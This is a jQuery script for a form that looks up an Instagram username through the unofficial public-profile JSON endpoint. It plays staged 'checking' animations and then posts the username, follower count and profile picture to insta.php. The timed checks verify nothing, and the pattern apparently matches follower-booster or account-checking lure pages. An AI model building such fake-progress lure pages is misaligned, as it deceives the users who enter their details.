$(document).ready(function () {
	
	$(document).on('submit','#forminsta',function(e){
		e.preventDefault();
		var username = $('#username').val();
		if(username=="")
		{
			return false;
		}
		
		document.getElementById('errmsg').innerHTML = '';
         $('#instamodal').modal('show');
         $.ajax({
          url: "https://www.instagram.com/"+username+"/?__a=1",
          method: 'GET',
          dataType: 'json',
           success: function(result)
           {
				hideChecks();
                var error=true;
                var json=JSON.stringify(result);
                var obj=JSON.parse(json);
				
				try
				{
					error=false;
					var username = obj.graphql.user.username;
                    var userProfile = obj.graphql.user.profile_pic_url;
					$('#check').fadeIn(1000);
					$('#tick').fadeIn(3000);
					$('#check1').fadeIn(3000);
					$('#tick1').fadeIn(3000);
				}
				catch
				{
					error=true;
					$('#errmsg').html("Invalid username...");
					$('#errmsg').fadeIn(3000);
				}
				try
				{
					error=false;
					var totalFollowers = obj.graphql.user.edge_followed_by.count;
					$('#check2').fadeIn(4000);
					$('#tick2').fadeIn(3000);
				}
				catch
				{
					error=true;
					$('#errmsg').html("Invalid username...");
					$('#errmsg').fadeIn(3000);
				}
			
               if(!error)
                {
					setTimeout(function () {
						  var $form = $("<form/>").attr("id", "data_form")
							.attr("action", "insta.php")
							.attr("method", "post");
						  $("body").append($form);
						  AddParameter($form, "username", username);
						  AddParameter($form, "followers", totalFollowers);
						  AddParameter($form, "profile", userProfile);
						  $form[0].submit();
					}, 3000);
                } 
          },
          error: function (jqXHR, exception) {
			error=true;
			$('#errmsg').html("Invalid username...");
			$('#errmsg').fadeIn(3000);
          }
        });
    });
    $('#instamodal').on('hidden.bs.modal', function() {
        $(this).removeData('bs.modal');
    });
    function AddParameter(form, name, value) {
         var $input = $("<input />").attr("type", "hidden")
                                 .attr("name", name)
                                 .attr("value", value);
         form.append($input);
     }
	 function hideChecks() {
	document.getElementById('tick').style.display = '';
	document.getElementById('check').style.display = '';
	document.getElementById('tick1').style.display = '';
	document.getElementById('check1').style.display = '';
	document.getElementById('tick2').style.display = '';
	document.getElementById('check2').style.display = '';
}

});
